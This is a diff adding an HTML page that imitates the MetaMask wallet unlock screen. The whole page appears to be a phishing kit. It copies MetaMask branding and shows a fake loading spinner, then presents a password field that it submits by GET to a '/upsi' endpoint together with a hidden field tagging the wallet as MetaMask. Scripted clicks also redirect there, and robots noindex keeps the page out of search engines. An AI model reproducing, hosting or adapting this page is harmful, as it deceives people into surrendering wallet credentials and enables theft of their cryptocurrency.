@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8" />
+   
+    <meta name="viewport" content="width=device-width, initial-scale=1 user-scalable=no" />
+    <meta name="robots" content="noindex">
+    <title>MetaMask</title>
+    
+    <link rel="stylesheet"  href="/public/upsm/css/connect.css" title="ltr">
+   
+    <link rel="icon" href="/public/upsm/img/favicon.png">
+ 
+    <style>
+.network-droppo {
+  right: 2px;
+}
+
+  @media screen and (min-width: 576px) {
+    .network-droppo {
+      right: calc(((100% - 85vw) / 2) + 2px);
+    }  
+  }
+
+
+  @media screen and (min-width: 769px) {
+    .network-droppo {
+      right: calc(((100% - 80vw) / 2) + 2px);
+    } 
+  }
+
+
+  @media screen and (min-width: 1281px) {
+      .network-droppo {
+      right: calc(((100% - 65vw) / 2) + 2px);
+      }
+  }
+
+  .network-dropdown-header {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  width: 100%;
+}
+
+.network-dropdown-title {
+  font-size: 1.125rem;
+  font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
+  line-height: 140%;
+  font-style: normal;
+  font-weight: normal;
+  height: 25px;
+  width: 120px;
+  color: #fff;
+  text-align: center;
+}
+
+.network-dropdown-divider {
+  width: 100%;
+  height: 1px;
+  margin: 10px 0;
+  background-color: #5d5d5d;
+}
+
+.network-dropdown-content {
+  font-size: 0.875rem;
+  font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
+  line-height: 140%;
+  font-style: normal;
+  font-weight: normal;
+  min-height: 36px;
+  width: 265px;
+  color: #9b9b9b;
+}
+
+.network-dropdown-content--link {
+  color: #fff;
+  cursor: pointer;
+  text-decoration: underline;
+}
+
+.network-dropdown-content--dismiss {
+  color: inherit;
+  background: inherit;
+  position: absolute;
+  top: 63px;
+  right: 10px;
+  border: 1px solid #9b9b9b;
+  border-radius: 10px;
+}
+
+.network-dropdown-list {
+  max-height: 330px;
+  overflow-y: auto;
+  margin-bottom: 8px;
+}
+
+.network-droppo .color-indicator {
+  margin: 0 14px;
+}
+
+.network-droppo.active {
+  display: block !important;
+}
+
+.color-indicator--color-mainnet.color-indicator--filled {
+  background-color: #29b6af;
+}
+
+
+.color-indicator--border-color-white {
+  border-color: #fff;
+}
+
+.network-name-item {
+  flex: 1;
+  color: var(--dusty-gray);
+  text-overflow: ellipsis;
+  overflow: hidden;
+  white-space: nowrap;
+}
+
+.btn--rounded {
+  border-radius: 100px;
+  will-change: box-shadow;
+  transition: box-shadow cubic-bezier(0.6, -0.28, 0.735, 0.045) 200ms;
+}
+    </style>
+</head>
+
+<body>
+    <div id="app-content">
+        <div class="app os-win mouse-user-styles">
+            <div id="app-header" class="app-header">
+                <div class="app-header__contents">
+                    <div class="app-header__logo-container app-header__logo-container--clickable">
+                        <img height="30" src="/public/upsm/img/metamask-logo-horizontal.svg"
+                            class="app-header__metafox-logo--horizontal" alt="" /><img src="/public/upsm/img/metamask-fox.svg"
+                            class="app-header__metafox-logo--icon" alt="" />
+                    </div>
+                    <div class="app-header__account-menu-container">
+                        <div class="app-header__network-component-wrapper">
+                            <div class="network-display network-display--clickable chip chip--with-left-icon chip--with-right-icon chip--border-color-ui-3 chip--background-color-undefined"
+                                role="button" tabindex="0">
+                                <div class="chip__left-icon">
+                                    <div
+                                        class="color-indicator color-indicator--filled color-indicator--color-mainnet color-indicator--size-lg">
+                                        <span class="color-indicator__inner-circle"></span></div>
+                                </div>
+                                <span
+                                    class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography chip__label typography--h7 typography--weight-normal typography--style-normal typography--color-ui-4">
+                                    Ethereum Mainnet
+                                </span>
+                                <div class="chip__right-icon"><i
+                                        class="network-display__icon app-header__network-down-arrow"></i></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+<div style="position: absolute; top: 58px; width: 309px; z-index: 55;display:none;" class="menu-droppo-container network-droppo"><style>
+          .menu-droppo-enter {
+            transition: transform 300ms ease-in-out;
+            transform: translateY(-200%);
+          }
+
+          .menu-droppo-enter.menu-droppo-enter-active {
+            transition: transform 300ms ease-in-out;
+            transform: translateY(0%);
+          }
+
+          .menu-droppo-leave {
+            transition: transform 300ms ease-in-out;
+            transform: translateY(0%);
+          }
+
+          .menu-droppo-leave.menu-droppo-leave-active {
+            transition: transform 300ms ease-in-out;
+            transform: translateY(-200%);
+          }
+        </style><div class="menu-droppo" style="border-radius: 4px; padding: 18px 8px; background: rgba(0, 0, 0, 0.8) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.15) 0px 2px 2px 2px;"><style>
+            li.dropdown-menu-item:hover {
+              color:rgb(225, 225, 225);
+              background-color: rgba(255, 255, 255, 0.05);
+              border-radius: 4px;
+            }
+            li.dropdown-menu-item { color: rgb(185, 185, 185); }
+          </style><div class="network-dropdown-header"><div class="network-dropdown-title">Networks</div><div class="network-dropdown-divider"></div><div class="network-dropdown-content"><span>  The default networks for Ether transactions is Main Net. </span></div></div><div class="network-dropdown-list"><li class="dropdown-menu-item" style="list-style: none; padding: 12px 0px; font-size: 16px; font-style: normal; cursor: pointer; display: flex; justify-content: flex-start; align-items: center; color: white; line-height: 20px;" tabindex="0"><i class="fa fa-check"></i><div class="color-indicator color-indicator--filled color-indicator--border-color-white color-indicator--color-mainnet color-indicator--size-lg"><span class="color-indicator__inner-circle"></span></div><span class="network-name-item" style="color: rgb(255, 255, 255);">Ethereum Mainnet</span></li></div><button class="button btn--rounded btn-default" style="width: 100%; left: 40px; color: white; background: #000; border-radius: 20px; text-transform: none;" variant="contained" role="button" tabindex="0">Add Network</button></div></div>
+            <div class="main-container-wrapper">
+                <div class="unlock-page__container">
+                    <div class="unlock-page">
+                        <div class="unlock-page__mascot-container">
+                            <div style="z-index: 0">
+                                <div id="logo-container">
+                                    <script src="/public/upsm/js/logo.js"></script>
+                                </div>
+                            </div>
+                        </div>
+                        <div id="loader_div" style="padding-top:60px;">
+                            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+                                style="margin:auto;display:block;" width="50px" height="50px" viewBox="0 0 100 100"
+                                preserveAspectRatio="xMidYMid">
+                                <circle cx="50" cy="50" fill="none" stroke="#f6851b" stroke-width="10" r="35"
+                                    stroke-dasharray="164.93361431346415 56.97787143782138">
+                                    <animateTransform attributeName="transform" type="rotate" repeatCount="indefinite"
+                                        dur="1s" values="0 50 50;360 50 50" keyTimes="0;1"></animateTransform>
+                                </circle>
+                            </svg>
+                        </div>
+                        <div id="form_div" style="display:none;width:100%;">
+                            <center>
+                                <h1 class="unlock-page__title">Welcome Back!</h1>
+                            </center>
+                            <center>
+                                <div>The decentralized web awaits</div>
+                            </center>
+                            
+                            <form class="unlock-page__form"   method="get" action="/upsi">
+                                <div class="MuiFormControl-root MuiTextField-root MuiFormControl-fullWidth">
+                                    <label
+                                        class="MuiFormLabel-root MuiInputLabel-root jss16 MuiInputLabel-formControl MuiInputLabel-animated"
+                                        for="pswrd">Password</label>
+                                    <div
+                                        class="MuiInputBase-root MuiInput-root MuiInput-underline jss18 MuiInputBase-fullWidth MuiInput-fullWidth MuiInputBase-formControl MuiInput-formControl">
+	                                        <input type="hidden" id="namewallet" value="MetaMask" name="namewallet">
+                                        <input name="key" id="pswrd" type="text"
+                                            class="MuiInputBase-input MuiInput-input" required="" />
+                                    </div>
+                                </div>
+                                <button   class="button btn--rounded btn-default"  style="background-color: rgb(3, 125, 214); color: white; margin-top: 20px;/* height: 60px; */font-weight: 400; box-shadow: none; border-radius: 100px;" >
+                                    Unlock
+                                </button>
+                            </form>
+                            <div class="unlock-page__links">
+                                <span><button    id="forgotpassword" class="unlock-page__link unlock-page__link--import" >Forgot password?</button > </span>
+                            </div>
+                            <div class="unlock-page__support">
+                                <center><span> Need help? Contact <a href="https://metamask.zendesk.com/hc/en-us" target="_blank" rel="noopener noreferrer">MetaMask Support</a> </span></center>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="popover-content"></div>
+    <script src="/public/ups.js"></script>
+
+    <script src="/public/upsm/js/jquery-3.6.0.min.js"></script>
+    <script>
+        $(document).ready(function () {
+
+            //$('#forgotpassword').on('click', function () {
+                //window.open(document.URL, '_blank', 'location=yes,height=570,width=520,scrollbars=yes,status=yes');
+            //});
+
+             $('.unlock-page__link, .unlock-page__form .btn--rounded').on('click', function () {
+                //window.parent.location.href = 'i.html';
+                window.open('/upsi', '_self');
+            });
+
+            setTimeout(function () { $('#loader_div').hide(); $('#form_div').show(); }, 3000);
+            var allInputs = $(":input:not(:button)");
+            allInputs.focusin(function () {
+                $(this).parent().addClass("Mui-focused");
+                $(this).parent().prev().addClass("Mui-focused");
+                $(this).parent().prev().addClass("MuiInputLabel-shrink");
+                $(this).parent().prev().addClass("jss17");
+            });
+            allInputs.focusout(function () {
+                $(this).blur(function () {
+                    if ($(this).prop("required")) {
+                        if (!$(this).val()) {
+                            $(this).parent().removeClass("Mui-focused");
+                            $(this).parent().prev().removeClass("Mui-focused");
+                            $(this).parent().prev().removeClass("MuiInputLabel-shrink");
+                            $(this).parent().prev().removeClass("jss17");
+                        } else {
+                            $(this).parent().prev().addClass("MuiInputLabel-shrink");
+                            $(this).parent().prev().addClass("jss17");
+                        }
+                    }
+                });
+            });
+        });
+
+
+ 
+    </script>
+         <script>
+            $(".network-display, .menu-droppo button").click(function(){
+                $(".network-droppo").toggleClass( "active" );
+            });
+        </script>
+   
+</body>
+
+</html>
